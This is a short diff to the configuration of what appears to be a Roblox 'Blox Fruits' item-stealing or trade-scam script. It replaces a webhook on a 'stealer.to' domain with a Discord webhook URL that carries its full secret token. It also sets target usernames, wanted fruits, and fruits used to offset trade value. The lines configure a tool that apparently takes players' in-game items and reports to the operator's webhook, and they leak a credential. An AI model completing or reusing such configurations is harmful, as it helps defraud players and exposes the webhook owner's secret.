@@ -1,4 +1,4 @@
-Webhook = "https://stealer.to/post?uniqueid=bc09f28b"
+Webhook = "https://discord.com/api/webhooks/1336745637919592570/DWS-AJephELmMgN374ewdQRASPDKgX3YjrLfqmU2dBDpGfvuXvIb7NQ2UjoDqtfaBki2"
 Usernames = {"GOUTEN_DZB", "isaw_23callmenoob"}
 Fruits = {"Dragon (west)-Dragon (west)", "Dragon (east)-Dragon (east)", "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
